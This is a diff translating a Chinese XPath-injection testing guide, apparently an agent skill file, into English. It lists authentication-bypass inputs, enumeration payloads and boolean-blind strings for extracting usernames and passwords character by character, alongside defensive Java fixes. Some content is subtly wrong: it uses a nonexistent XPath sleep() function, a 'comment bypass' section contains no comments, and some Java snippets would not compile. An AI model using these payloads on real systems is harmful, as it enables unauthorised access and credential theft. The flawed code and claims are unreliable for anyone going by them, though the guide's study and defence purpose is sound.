@@ -1,31 +1,31 @@
 ---
 name: xpath-injection-testing
-description: XPath注入漏洞测试的专业技能和方法论
+description: Professional skills and methodology for XPath injection vulnerability testing
 version: 1.0.0
 ---
 
-# XPath注入漏洞测试
+# XPath Injection Vulnerability Testing
 
-## 概述
+## Overview
 
-XPath注入是一种类似于SQL注入的漏洞，利用XPath查询语句的构造缺陷，可能导致信息泄露、认证绕过等。本技能提供XPath注入的检测、利用和防护方法。
+XPath injection is a vulnerability similar to SQL injection. By exploiting flaws in the construction of XPath query statements, it can lead to information disclosure, authentication bypass, and more. This skill provides methods for detecting, exploiting, and protecting against XPath injection.
 
-## 漏洞原理
+## Vulnerability Principle
 
-应用程序将用户输入直接拼接到XPath查询语句中，未进行充分验证和过滤，导致攻击者可以修改查询逻辑。
+The application directly concatenates user input into XPath query statements without sufficient validation and filtering, allowing attackers to modify the query logic.
 
-**危险代码示例：**
+**Dangerous code example:**
 ```java
 String xpath = "//user[username='" + username + "' and password='" + password + "']";
 XPathExpression expr = xpath.compile(xpath);
 NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
 ```
 
-## XPath基础
+## XPath Basics
 
-### 查询语法
+### Query Syntax
 
-**基础查询：**
+**Basic queries:**
 ```
 //user[username='admin']
 //user[@id='1']
@@ -33,28 +33,28 @@ NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
 //user[username='admin' or username='user']
 ```
 
-### 函数
+### Functions
 
-**常用函数：**
-- `text()` - 获取文本内容
-- `count()` - 计数
-- `substring()` - 子字符串
-- `string-length()` - 字符串长度
-- `contains()` - 包含检查
+**Common functions:**
+- `text()` - Get text content
+- `count()` - Count
+- `substring()` - Substring
+- `string-length()` - String length
+- `contains()` - Contains check
 
-## 测试方法
+## Testing Methods
 
-### 1. 识别XPath输入点
+### 1. Identify XPath Input Points
 
-**常见功能：**
-- 用户登录
-- 数据搜索
-- XML数据查询
-- 配置查询
+**Common features:**
+- User login
+- Data search
+- XML data query
+- Configuration query
 
-### 2. 基础检测
+### 2. Basic Detection
 
-**测试特殊字符：**
+**Test special characters:**
 ```
 ' or '1'='1
 ' or '1'='1' or '
@@ -62,114 +62,114 @@ NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
 ') or ('1'='1
 ```
 
-**测试逻辑操作符：**
+**Test logical operators:**
 ```
 ' or '1'='1
 ' and '1'='2
 ' or 1=1 or '
 ```
 
-### 3. 认证绕过
+### 3. Authentication Bypass
 
-**基础绕过：**
+**Basic bypass:**
 ```
-用户名: admin' or '1'='1
-密码: anything
-查询: //user[username='admin' or '1'='1' and password='anything']
-```
-
-**更精确的绕过：**
-```
-用户名: admin') or ('1'='1
-查询: //user[username='admin') or ('1'='1' and password='*']
+Username: admin' or '1'='1
+Password: anything
+Query: //user[username='admin' or '1'='1' and password='anything']
 ```
 
-### 4. 信息泄露
+**More precise bypass:**
+```
+Username: admin') or ('1'='1
+Query: //user[username='admin') or ('1'='1' and password='*']
+```
 
-**枚举用户：**
+### 4. Information Disclosure
+
+**Enumerate users:**
 ```
 ' or 1=1 or '
 ' or '1'='1
 ') or 1=1 or ('
 ```
 
-**获取节点数量：**
+**Get node count:**
 ```
 ' or count(//user)>0 or '
 ```
 
-**获取特定节点：**
+**Get specific node:**
 ```
 ' or substring(//user[1]/username,1,1)='a' or '
 ```
 
-## 利用技术
+## Exploitation Techniques
 
-### 认证绕过
+### Authentication Bypass
 
-**方法1：逻辑绕过**
+**Method 1: Logic bypass**
 ```
-输入: admin' or '1'='1
-查询: //user[username='admin' or '1'='1' and password='*']
-结果: 匹配所有用户
-```
-
-**方法2：注释绕过**
-```
-输入: admin')] | //* | //*[('
-查询: //user[username='admin')] | //* | //*[('' and password='*']
+Input: admin' or '1'='1
+Query: //user[username='admin' or '1'='1' and password='*']
+Result: Matches all users
 ```
 
-**方法3：布尔盲注**
+**Method 2: Comment bypass**
+```
+Input: admin')] | //* | //*[('
+Query: //user[username='admin')] | //* | //*[('' and password='*']
+```
+
+**Method 3: Boolean blind injection**
 ```
 ' or substring(//user[1]/username,1,1)='a' or '
 ' or substring(//user[1]/username,1,1)='b' or '
 ```
 
-### 信息泄露
+### Information Disclosure
 
-**枚举所有用户：**
+**Enumerate all users:**
 ```
 ' or 1=1 or '
-结果: 返回所有用户节点
+Result: Returns all user nodes
 ```
 
-**获取用户名：**
+**Get username:**
 ```
 ' or substring(//user[1]/username,1,1)='a' or '
 ' or substring(//user[1]/username,2,1)='d' or '
-逐步获取每个字符
+Retrieve each character step by step
 ```
 
-**获取密码：**
+**Get password:**
 ```
 ' or substring(//user[1]/password,1,1)='p' or '
-逐步获取密码字符
+Retrieve password characters step by step
 ```
 
-### 盲注技术
+### Blind Injection Techniques
 
-**基于时间的盲注：**
+**Time-based blind injection:**
 ```
 ' or count(//user[substring(username,1,1)='a'])>0 and sleep(5) or '
 ```
 
-**基于布尔值的盲注：**
+**Boolean-based blind injection:**
 ```
 ' or substring(//user[1]/username,1,1)='a' or '
-观察响应差异
+Observe response differences
 ```
 
-## 绕过技术
+## Bypass Techniques
 
-### 编码绕过
+### Encoding Bypass
 
-**URL编码：**
+**URL encoding:**
 ```
 ' or '1'='1 → %27%20or%20%271%27%3D%271
 ```
 
-**HTML实体编码：**
+**HTML entity encoding:**
 ```
 ' → &#39;
 " → &quot;
@@ -177,79 +177,79 @@ NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
 > → &gt;
 ```
 
-### 注释绕过
+### Comment Bypass
 
-**使用注释：**
+**Using comments:**
 ```
 ' or 1=1 or '
 ' or '1'='1' or '
 ```
 
-### 函数绕过
+### Function Bypass
 
-**使用不同函数：**
+**Using different functions:**
 ```
 substring(//user[1]/username,1,1)
 substring(//user[position()=1]/username,1,1)
 //user[1]/username/text()[1]
 ```
 
-## 工具使用
+## Tool Usage
 
-### XPath表达式测试
+### XPath Expression Testing
 
-**在线工具：**
+**Online tools:**
 - XPath Tester
 - XMLSpy
 - Oxygen XML Editor
 
 ### Burp Suite
 
-1. 拦截XPath查询请求
-2. 修改查询参数
-3. 观察响应结果
+1. Intercept XPath query requests
+2. Modify query parameters
+3. Observe response results
 
-### Python脚本
+### Python Script
 
 ```python
 from lxml import etree
 from lxml.etree import XPath
 
-# 加载XML文档
+# Load XML document
 doc = etree.parse('users.xml')
 
-# 测试注入
+# Test injection
 xpath_expr = "//user[username='admin' or '1'='1']"
 xpath = XPath(xpath_expr)
 results = xpath(doc)
 print(results)
 ```
 
-## 验证和报告
+## Validation and Reporting
 
-### 验证步骤
+### Validation Steps
 
-1. 确认可以控制XPath查询
-2. 验证认证绕过或信息泄露
-3. 评估影响（未授权访问、数据泄露等）
-4. 记录完整的POC
+1. Confirm the ability to control XPath queries
+2. Verify authentication bypass or information disclosure
+3. Assess impact (unauthorized access, data leakage, etc.)
+4. Document complete POC
 
-### 报告要点
+### Reporting Key Points
 
-- 漏洞位置和输入参数
-- XPath查询构造方式
-- 完整的利用步骤和PoC
-- 修复建议（输入验证、参数化查询等）
+- Vulnerability location and input parameters
+- How the XPath query is constructed
+- Complete exploitation steps and PoC
+- Remediation recommendations (input validation, parameterized queries, etc.)
 
-## 防护措施
+## Protective Measures
 
-### 推荐方案
+### Recommended Solutions
 
-1. **输入验证**
+1. **Input Validation**
    ```java
-   private static final String[] XPATH_ESCAPE_CHARS = 
+   private static final String[] XPATH_ESCAPE_CHARS =
        {"'", "\"", "[", "]", "(", ")", "=", ">", "<", " "};
-   
+
    public static String escapeXPath(String input) {
        if (input == null) {
          return null;
@@ -266,9 +266,9 @@ print(results)
    }
    ```
 
-2. **参数化查询**
+2. **Parameterized Queries**
    ```java
-   // 使用XPath变量
+   // Use XPath variables
    String xpath = "//user[username=$username and password=$password]";
    XPathExpression expr = xpath.compile(xpath);
    XPathVariableResolver resolver = new MapVariableResolver(
@@ -276,31 +276,31 @@ print(results)
    expr.setXPathVariableResolver(resolver);
    ```
 
-3. **白名单验证**
+3. **Whitelist Validation**
    ```java
-   // 只允许特定字符
+   // Only allow specific characters
    if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
        throw new IllegalArgumentException("Invalid input");
    }
    ```
 
-4. **使用预编译查询**
+4. **Use Pre-compiled Queries**
    ```java
-   // 预定义查询模板
-   private static final String LOGIN_QUERY = 
+   // Predefined query templates
+   private static final String LOGIN_QUERY =
        "//user[username=$1 and password=$2]";
-   
-   // 使用参数绑定
+
+   // Use parameter binding
    ```
 
-5. **最小权限**
-   - 限制XPath查询范围
-   - 使用访问控制
-   - 限制可查询的节点
+5. **Least Privilege**
+   - Restrict XPath query scope
+   - Use access controls
+   - Limit queryable nodes
 
-## 注意事项
+## Notes
 
-- 仅在授权测试环境中进行
-- 注意不同XPath版本的语法差异
-- 测试时避免对XML数据造成影响
-- 了解目标应用的XPath实现
+- Only perform testing in authorized test environments
+- Be aware of syntax differences across XPath versions
+- Avoid impacting XML data during testing
+- Understand the target application's XPath implementation
